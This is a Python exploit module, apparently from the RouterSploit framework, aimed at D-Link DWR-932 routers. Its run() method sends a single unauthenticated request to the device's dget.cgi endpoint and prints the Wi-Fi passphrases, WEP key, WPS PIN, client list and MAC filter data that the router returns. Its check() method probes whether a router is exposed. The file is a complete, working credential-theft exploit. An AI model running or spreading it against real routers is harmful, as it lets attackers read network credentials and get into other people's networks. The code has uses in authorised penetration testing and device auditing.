import json

from routersploit import (
    exploits,
    print_success,
    print_error,
    print_table,
    print_status,
    http_request,
    mute,
    validators,
)


class Exploit(exploits.Exploit):
    """
    Exploit implementation for D-Link DWR-932 Information Disclosure vulnerability.
    If the target is vulnerable it allows to read credentials for administrator."
    """
    __info__ = {
        'name': 'D-Link DWR-932 Info Disclosure',
        'description': 'Module explois information disclosure vulnerability in D-Link DWR-932 devices. It is possible to retrieve sensitive information such as credentials.',
        'authors': [
            'Saeed reza Zamanian'  # vulnerability discovery
            'Marcin Bury <marcin.bury[at]reverse-shell.com>',  # routersploit module
        ],
        'references': [
            'https://www.exploit-db.com/exploits/39581/',
        ],
        'devices': [
            'D-Link DWR-932',
        ]
    }

    target = exploits.Option('', 'Target address e.g. http://192.168.1.1', validators=validators.url)  # target address
    port = exploits.Option(80, 'Target port')  # default port

    def run(self):
        url = "{}:{}/cgi-bin/dget.cgi?cmd=wifi_AP1_ssid,wifi_AP1_hidden,wifi_AP1_passphrase,wifi_AP1_passphrase_wep,wifi_AP1_security_mode,wifi_AP1_enable,get_mac_filter_list,get_mac_filter_switch,get_client_list,get_mac_address,get_wps_dev_pin,get_wps_mode,get_wps_enable,get_wps_current_time&_=1458458152703".format(self.target, self.port)

        response = http_request(method="GET", url=url)
        if response is None:
            return

        try:
            print_status("Decoding JSON")
            data = json.loads(response.text)
        except ValueError:
            print_error("Exploit failed - response is not valid JSON")
            return

        if len(data):
            print_success("Exploit success")

        rows = []
        for key in data.keys():
            if len(data[key]) > 0:
                rows.append((key, data[key]))

        headers = ("Parameter", "Value")
        print_table(headers, *rows)

    @mute
    def check(self):
        url = "{}:{}/cgi-bin/dget.cgi?cmd=wifi_AP1_ssid,wifi_AP1_hidden,wifi_AP1_passphrase,wifi_AP1_passphrase_wep,wifi_AP1_security_mode,wifi_AP1_enable,get_mac_filter_list,get_mac_filter_switch,get_client_list,get_mac_address,get_wps_dev_pin,get_wps_mode,get_wps_enable,get_wps_current_time&_=1458458152703".format(self.target, self.port)

        response = http_request(method="GET", url=url)
        if response is None:
            return False  # target is not vulnerable

        if response.status_code == 200:
            try:
                data = json.loads(response.text)
                if len(data):
                    return True  # target is vulnerable
            except ValueError:
                return False  # target is not vulnerable

        return False  # target is not vulnerable
